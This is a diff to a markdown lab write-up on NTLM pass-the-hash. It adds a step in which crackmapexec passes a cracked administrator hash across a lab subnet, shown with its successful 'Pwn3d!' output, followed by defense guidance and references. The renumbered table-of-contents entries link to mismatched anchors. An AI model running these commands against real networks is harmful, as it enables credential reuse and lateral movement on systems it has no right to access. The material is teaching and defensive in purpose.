@@ -8,7 +8,6 @@
 
 ## Table of Contents
 
-```
 - [Overview](#whats-the-point)
 - [How NTLM Auth Actually Works](#how-ntlm-auth-actually-works)
 - [Lab Setup](#lab-setup)
@@ -16,11 +15,10 @@
 - [Step 2 — Deeper Dump with secretsdump](#step-2--deeper-dump-with-secretsdump)
 - [Step 3 — Save the Hashes](#step-3--save-the-hashes)
 - [Step 4 — Crack the Hashes with Hashcat](#step-4--crack-the-hashes-with-hashcat)
-- [Step 5 — Open the Hash File Again and Copy the NT Hash](#step-5--open-the-hash-file-again-and-copy-the-nt-hash)
-- [Step 6 — Pass the Hash with CrackMapExec](#step-6--pass-the-hash-with-crackmapexec)
-- [Step 7 — Get a Shell with psexec](#step-7--get-a-shell-with-psexec)
+- [Step 5 — Pass the Hash with CrackMapExec](#step-6--pass-the-hash-with-crackmapexec)
+- [Step 6 — Get a Shell with psexec](#step-7--get-a-shell-with-psexec)
 - [Full Attack Summary](#full-attack-summary)
-```
+
 
 
 ## Overview
@@ -248,10 +246,87 @@ Candidates.#01...:  laylanie -> $HEX[042a0337c2a156616d6f732103]
 Hardware.Mon.#01.: Util: 23%
 ```
 
-Password1 is the password behind 64f12cdd... — so Administrator on VICTIM-1, rahim, and karim all use Password1
+Password1 is the password behind 64f12cdd... — so Administrator on VICTIM-1, rahim, and karim all use Password1. The other hash 31d6cfe0... is an empty password — that's Guest, DefaultAccount.
 
 <p align="center">
   <img src="/writeups/pass the hash/images/step4-1.png" width="600">
 </p>
 
+# Step 5 — Pass the Hash
+
+Now I skip the password completely and just use the hash with -H. Two tries here.
+
+```bash
+crackmapexec smb 192.168.5.0/24 -u administrator -H 64f12cddaa88057e06a81b54e73b949b --local-auth
+```
+
+Result:
+
+```
+SMB         192.168.5.136   445    VICTIM-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-2) (domain:VICTIM-2) (signing:False) (SMBv1:False)
+SMB         192.168.5.135   445    VICTIM-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-1) (domain:VICTIM-1) (signing:False) (SMBv1:False)
+SMB         192.168.5.136   445    VICTIM-2         [-] VICTIM-2\administrator:64f12cddaa88057e06a81b54e73b949b STATUS_LOGON_FAILURE 
+SMB         192.168.5.135   445    VICTIM-1         [+] VICTIM-1\administrator:64f12cddaa88057e06a81b54e73b949b (Pwn3d!)
+```
+
+VICTIM-1 hit. VICTIM-2 failed because its local Administrator has a different hash (31d6cfe0... — blank password). The hash I'm passing only works on machines where Administrator has Password1.
+
+<p align="center">
+  <img src="/writeups/pass the hash/images/step5-1.png" width="600">
+</p>
+
+## Defense / Mitigation
+
+Pass-the-Hash works because stolen NTLM hashes can still be reused for authentication. The goal of defense is to stop hash reuse and limit where credentials can travel.
+
+### 1. Disable or Reduce NTLM Usage
+- Prefer Kerberos authentication instead of NTLM
+- Restrict NTLM where possible using Group Policy
+- Monitor systems still using NTLM
+
+### 2. Enable Credential Guard
+- Isolates and protects credentials from memory extraction
+- Prevents tools from accessing LSASS easily
+
+### 3. Use Unique Local Administrator Passwords
+- Never reuse the same local admin password across machines
+- Use tools like LAPS (Local Administrator Password Solution)
+
+### 4. Apply Least Privilege
+- Users should not have admin rights unless required
+- Separate admin accounts from normal user accounts
+- Avoid logging in as Domain Admin on workstations
+
+### 5. Limit Lateral Movement
+- Segment the network (users, servers, DCs)
+- Restrict SMB (port 445) between workstations where possible
+- Block admin shares from non-admin systems
+
+### 6. Protect LSASS Process
+- Enable RunAsPPL (Protected Process Light)
+- Prevent credential dumping from memory
+
+### 7. Patch and Update Systems
+- Keep Windows and domain controllers updated
+- Fix known SMB and authentication vulnerabilities
+
+---
+
+## Key Takeaways
+
+- Pass-the-Hash does NOT need the real password
+- NTLM hashes can be reused directly for authentication
+- Reusing local admin passwords makes lateral movement easy
+- One compromised machine can lead to full domain access
+- Kerberos + proper privilege separation reduces risk significantly
+- Monitoring authentication logs is critical in detection
+
+---
+
+## References
+
+- https://attack.mitre.org/techniques/T1550/002/ (Pass-the-Hash - MITRE ATT&CK)
+- https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview (NTLM Authentication - Microsoft)
+- https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/ (Credential Guard - Microsoft)
+- https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview (Microsoft LAPS)
                                                                                 
